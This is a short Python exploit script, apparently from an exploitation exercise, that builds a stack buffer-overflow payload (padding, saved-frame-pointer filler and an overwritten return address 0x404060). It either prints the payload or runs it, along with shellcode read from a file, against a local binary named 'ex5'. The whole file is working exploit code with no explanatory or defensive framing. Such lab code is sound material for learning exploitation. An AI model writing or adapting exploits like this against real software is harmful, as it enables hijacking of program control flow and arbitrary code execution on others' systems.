#!/usr/bin/env python3

import subprocess
import sys


buf = b"A" * 32
rbp = b"B" * 8
ret = (0x404060).to_bytes(3, "little")
exploit = buf + rbp + ret

if len(sys.argv) > 1:
    with open("shellcode", "rb") as f_shellcode:
        shellcode = f_shellcode.read()
        print(shellcode)

        subprocess.call(["./ex5", shellcode, exploit])
else:
    sys.stdout.buffer.write(exploit + b"\x00")
